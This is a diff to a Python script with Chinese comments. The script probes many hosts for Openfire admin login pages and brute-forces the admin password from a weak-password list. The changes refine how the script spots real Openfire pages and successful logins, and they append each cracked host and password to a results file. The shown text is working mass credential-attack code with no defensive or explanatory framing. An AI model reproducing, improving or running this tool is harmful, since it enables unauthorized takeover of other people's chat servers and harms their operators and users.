@@ -55,25 +55,32 @@ try:
         i = 1 
         all_s = len(s)
         for u in s:
+            flag = 1
             process = "当前进度--> {:.2%}".format(i / all_s)
             try:
                 url = "http://" + u.strip('\n') + "/login.jsp"
                 # 测试连接是否正常
                 response = requests.get(url, verify=False, allow_redirects=True, timeout=2)
-                if response.status_code == 200:
+                if ("Openfire" in response.text) and (response.status_code == 200):
                     print(response.status_code, "%s -连接成功-->" % process, url)
+                    flag = 1
                 else:
-                    print("001%s  -网页无效--> %s -------Error!!!" % (process, url))
+                    print("001 %s  -网页无效--> %s -------Error!!!" % (process, url))
+                    flag = 0
                 # 测试登录是否异常
                 response_post_test = requests.post(url, verify=False, allow_redirects=True, data=data, headers=headers, timeout=2)
-                status_code_list = [200, 301, 302]
-                if (response_post_test.status_code not in status_code_list):
+                #print("111111111111111111", response_post_test.status_code)
+                if (response_post_test.status_code > 320):
                     print("004------登录异常--> %s -------Error!!!" % response_post_test.status_code)
-                    continue
+                    flag = 0
                 else:
                     # print(response_post_test.status_code)
                     pass
-                ok_scan.append(url)
+                if flag == 1:
+                    # print(url)
+                    ok_scan.append(url)
+                else:
+                    pass
             except Exception as e:
                 if "Connection aborted" in str(e):
                     print("001%s  -网页无效--> %s -------Error!!!" % (process, url))
@@ -112,31 +119,33 @@ try:
             for wp in weakpass:
                 process2 = "---progress--> {:.2%} ".format(z / all_p)
                 try:
-                    data['password'] = wp
+                    data['password'] = wp.strip('\n')
                     response = requests.post(b, verify=False, allow_redirects=True, data=data, headers=headers, timeout=3)
                     # print(response.text)
-                    if ("Login failed" in response.text) or ("登录失败" in response.text) or ("BEGIN error box" in response.text):
+                    if ("Login failed" in response.text) or ("登录失败" in response.text) or ("BEGIN error box" in response.text) or ("jive-error-text" in response.text):
                         #print("%s %s 爆破失败---admin--%s" % (response.status_code, process2, wp))
                         bar.next()
                         pass
                     # or ("Behaviour.register(myrules)" in response.text))
-                    elif(len(response.text) > 500):
+                    elif((len(response.text) > 10000) and ("Add a nice little rollover effect" in response.text)) or ("Welcome to Openfire Setup" in response.text):
                         print("%s 爆破成功---admin--%s-----Successful!" % (process2, wp.strip('\n')))
                         #print(response.status_code, response.headers['location'])
-                        f2.write("%s 爆破成功---admin--%s-----Successful!" % (b, wp.strip('\n')))
+                        f2.write("%s 爆破成功---admin--%s-----Successful!\n" % (b, wp.strip('\n')))
                         bar.next(100)
                         break
                     else:
-                        print(response.status_code)
+                        pass
+                        if response.status_code != 200:
+                            print(response.status_code)
                 except Exception as e:
                     if "Connection aborted" in str(e):
-                        print("001%s  -网页无效--> %s -------Error!!!" % (process2, url))
+                        print("\n001%s  -网页无效--> %s -------Error!!!" % (process2, url))
                         break
                     elif "NewConnectionError" in str(e):
-                        print("002%s  -拒绝请求--> %s -------Error!!!" % (process2, url))
+                        print("\n002%s  -拒绝请求--> %s -------Error!!!" % (process2, url))
                         break
                     elif "HTTPConnectionPool" in str(e):
-                        print("003%s  -连接超时--> %s -------Error!!!" % (process2, url))
+                        print("\n003%s  -连接超时--> %s -------Error!!!" % (process2, url))
                         break
                     else:
                         print(e)
